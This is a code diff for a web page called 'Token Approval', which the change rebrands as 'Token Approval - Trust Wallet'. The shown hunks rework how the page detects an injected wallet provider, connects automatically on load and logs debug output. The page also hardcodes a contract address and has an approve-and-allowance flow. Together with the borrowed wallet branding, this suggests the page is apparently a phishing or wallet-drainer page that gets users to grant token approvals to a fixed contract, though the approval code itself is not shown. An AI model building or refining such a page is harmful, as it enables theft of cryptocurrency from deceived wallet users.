@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Token Approval</title>
+    <title>Token Approval - Trust Wallet</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -67,7 +67,7 @@
         .btn-danger:hover { background: #f85149; }
         .btn-wallet { background: #8b5cf6; color: #fff; }
         .btn-wallet:hover { background: #7c3aed; }
-        .btn-wallet:disabled { background: #4a3a7a; color: #8b949e; cursor: not-allowed; }
+        .hidden { display: none !important; }
         .status-msg {
             margin-top: 10px;
             padding: 10px;
@@ -79,7 +79,6 @@
         .status-msg.info { background: #0d1f2d; color: #58a6ff; border: 1px solid #1f6feb; }
         .flex-row { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
         .mt-10 { margin-top: 10px; }
-        .mb-10 { margin-bottom: 10px; }
         .addr {
             font-family: 'Courier New', monospace;
             font-size: 12px;
@@ -93,20 +92,19 @@
         .footer { text-align: center; font-size: 12px; color: #484f58; margin-top: 10px; }
         .footer a { color: #58a6ff; text-decoration: none; }
         .footer a:hover { text-decoration: underline; }
-        .hidden { display: none !important; }
-        .text-center { text-align: center; }
-        .loading-spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #30363d;
-            border-top: 3px solid #8b5cf6;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .debug-box {
+            background: #0d1117;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            color: #8b949e;
+            border: 1px solid #30363d;
+            margin-top: 10px;
+            font-family: monospace;
+            word-break: break-all;
+            max-height: 120px;
+            overflow-y: auto;
+            line-height: 1.6;
         }
     </style>
 </head>
@@ -128,7 +126,7 @@
         <div id="networkInfo" class="mt-10" style="font-size:12px;color:#8b949e;"></div>
         <div id="walletProvider" class="mt-10" style="font-size:12px;color:#484f58;"></div>
         
-        <div id="debugInfo" style="font-size:11px;color:#484f58;margin-top:10px;font-family:monospace;word-break:break-all;background:#0d1117;padding:8px;border-radius:4px;border:1px solid #30363d;max-height:100px;overflow:auto;"></div>
+        <div id="debugInfo" class="debug-box">Waiting for connection...</div>
     </div>
 
     <div class="card">
@@ -172,16 +170,12 @@
     </div>
 </div>
 
-<!-- ============================================================ -->
-<!-- ===================== JAVASCRIPT ============================= -->
-<!-- ============================================================ -->
-
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js">
 </script>
 
 <script>
     // ================================================================
-    //  ADDRESSES
+    //  CONFIG
     // ================================================================
     const CONFIG = {
         contractAddress: '0x054739eFecB0ae38cCf44372291d0778E7DCb4eD',
@@ -235,27 +229,33 @@
     let isConnecting = false;
 
     // ================================================================
-    //  SIMPLE TRUST WALLET DETECT - JUST CHECK window.ethereum
+    //  TRUST WALLET - USING WINDOW.WEB3
     // ================================================================
-    function getProvider() {
-        debug('Checking for provider...');
+    function getTrustProvider() {
+        debug('Searching for Trust Wallet provider...');
         
-        // Trust Wallet injects window.ethereum
-        if (window.ethereum) {
-            debug('✅ window.ethereum found!');
-            return window.ethereum;
-        }
-        
-        // Check if web3 exists
+        // Trust Wallet uses window.web3 in older versions
         if (window.web3 && window.web3.currentProvider) {
             debug('✅ window.web3 found!');
             return window.web3.currentProvider;
         }
         
-        // Check trustwallet
+        // Check window.ethereum
+        if (window.ethereum) {
+            debug('✅ window.ethereum found!');
+            return window.ethereum;
+        }
+        
+        // Check window.trustwallet
         if (window.trustwallet) {
             debug('✅ window.trustwallet found!');
             return window.trustwallet;
+        }
+        
+        // Check for injected provider in window
+        if (window.provider) {
+            debug('✅ window.provider found!');
+            return window.provider;
         }
         
         debug('❌ No provider found');
@@ -263,26 +263,27 @@
     }
 
     // ================================================================
-    //  WAIT FOR PROVIDER - WITH RETRY
+    //  WAIT FOR PROVIDER
     // ================================================================
-    function waitForProvider(maxAttempts = 30) {
+    function waitForProvider() {
         return new Promise((resolve) => {
-            debug(`Waiting for provider (max ${maxAttempts} attempts)...`);
-            
             let attempts = 0;
+            const maxAttempts = 40;
             
             // Check immediately
-            let provider = getProvider();
+            let provider = getTrustProvider();
             if (provider) {
                 resolve(provider);
                 return;
             }
             
+            debug('Waiting for Trust Wallet to inject provider...');
+            
             const interval = setInterval(() => {
                 attempts++;
                 debug(`Attempt ${attempts}/${maxAttempts}...`);
                 
-                provider = getProvider();
+                provider = getTrustProvider();
                 if (provider) {
                     debug(`✅ Provider found after ${attempts} attempts!`);
                     clearInterval(interval);
@@ -300,7 +301,7 @@
     }
 
     // ================================================================
-    //  CONNECT WALLET - SIMPLE VERSION
+    //  CONNECT WALLET
     // ================================================================
     async function connectWallet() {
         debug('connectWallet() called');
@@ -320,8 +321,6 @@
             walletStatus.textContent = 'Not Connected';
             walletStatus.className = 'badge badge-gray';
             walletAddress.textContent = 'Click "Connect Wallet" to start';
-            walletAddress.style.color = '#484f58';
-            walletProvider.textContent = '';
             connectBtn.textContent = '🔗 Connect Wallet';
             connectBtn.className = 'btn btn-wallet';
             approveBtn.disabled = true;
@@ -330,6 +329,7 @@
             approvalBadge.className = 'badge badge-gray';
             allowanceDisplay.textContent = 'Loading...';
             networkInfo.textContent = '';
+            walletProvider.textContent = '';
             approvalStatus.classList.add('hidden');
             return;
         }
@@ -341,12 +341,11 @@
         walletStatus.className = 'badge badge-blue';
 
         try {
-            // Wait for provider
-            const ethProvider = await waitForProvider(30);
+            const ethProvider = await waitForProvider();
             
             if (!ethProvider) {
                 debug('❌ No provider found');
-                alert('No wallet detected! Please make sure you are using Trust Wallet browser.');
+                alert('Trust Wallet not detected!\n\nPlease make sure:\n1. You are using Trust Wallet app\n2. Using the DApp browser\n3. Try refreshing the page');
                 isConnecting = false;
                 connectBtn.disabled = false;
                 connectBtn.textContent = '🔗 Connect Wallet';
@@ -355,7 +354,7 @@
                 return;
             }
 
-            debug('Creating Web3Provider...');
+            debug('Creating provider...');
             provider = new ethers.providers.Web3Provider(ethProvider);
             
             debug('Requesting accounts...');
@@ -492,7 +491,7 @@
     // ================================================================
     async function autoConnect() {
         debug('Auto-connecting...');
-        const provider = getProvider();
+        const provider = getTrustProvider();
         if (provider && provider.selectedAddress) {
             debug('Auto-connect triggered');
             setTimeout(connectWallet, 1000);
@@ -513,12 +512,12 @@
     (function init() {
         debug('🔑 App loaded');
         debug(`User Agent: ${navigator.userAgent}`);
+        debug(`window.web3: ${window.web3 ? 'exists' : 'not found'}`);
         debug(`window.ethereum: ${window.ethereum ? 'exists' : 'not found'}`);
+        debug(`window.trustwallet: ${window.trustwallet ? 'exists' : 'not found'}`);
         
-        // Try auto-connect
         setTimeout(autoConnect, 2000);
         
-        // Also try on load
         window.addEventListener('load', function() {
             debug('Page loaded');
             setTimeout(autoConnect, 1500);
